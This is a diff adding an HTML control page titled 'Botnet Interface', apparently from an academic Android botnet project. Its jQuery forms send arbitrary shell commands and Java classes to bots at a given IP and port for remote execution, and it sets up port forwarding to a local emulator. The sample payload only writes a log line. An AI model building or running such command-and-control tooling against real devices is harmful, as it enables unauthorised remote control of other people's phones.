@@ -1,0 +1,73 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+    "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+    <title>Botnet Interface</title>
+    <script type="text/javascript" src="/static/jquery-1.7.js"></script>
+    <script type="text/javascript" src="/static/jquery.json-2.3.js"></script>
+<script type="text/javascript">
+$.postJSON = function(url, data, callback) {
+    $.ajaxSetup({ scriptCharset:"utf-8", 
+                    contentType:"application/json; charset=utf-8" });
+    $.post(url, $.toJSON(data), callback, "json");
+}
+
+$(function() {
+
+    $("#commandexecute").on("click", function() {
+        var postdata = {ip: $("#ip").val(), command: $("#command").val(), port: $("#port").val()} ;
+        $.postJSON('/executecommand', postdata, function(data) {
+            $("#commandresult").html(data["time"] + ":<br>" + data['output']) ;
+        });
+    });
+
+    $("#codeexecute").on("click", function() {
+        var postdata = {ip: $("#ip").val(), code: $("#code").val(), port: $("#port").val(), classname: $("#classname").val()} ;
+        $.postJSON('/executecode', postdata, function(data) {
+            $("#coderesult").html(data["time"] + ":<br>" + data['output']) ;
+        });
+    });
+
+    $("#setupforwarding").on("click", function() {
+        var postdata = {port: $("#port").val()} ;
+        $.postJSON('/setupforwarding', postdata, function(data) {
+        });
+    });
+});
+</script>
+<style type="text/css">
+.output { white-space: pre; }
+</style>
+</head>
+    <body>
+    <div>IP: <input id="ip" type="text" value="127.0.0.1">
+    <div>Port: <input id="port" type="text" value="8081">
+    <input type="button" id="setupforwarding" value="Setup forwarding between emulator at 127.0.0.1:5554 and specified port"></div>
+    <h1>Send command</h1>
+        <div>
+        <label for="command">Command:</label>
+        <input type="text" id="command" > <br >
+
+        <input id="commandexecute" type="submit" value="Execute" >
+	<div class="output" id="commandresult"></div>
+        </div>
+
+    <h1>Send code</h1>
+        <div>
+	<div><textarea cols=120 rows=10 id="code">
+package de.tudarmstadt.botnet.janus_yanai;
+import android.util.Log;
+public class Hello__VERSION__ implements java.util.concurrent.Callable&lt;String&gt; {
+    public String call() {
+        Log.d("LOL", "GUIDO GUIDO");
+        return "ok, executed";
+    }
+}
+</textarea></div>
+	<input id="classname" type="text" value="Hello__VERSION__" >
+        <input type="button" value="Execute code" id="codeexecute" >
+	<div class="output" id="coderesult"></div>
+	</div>
+    </body>
+</html>
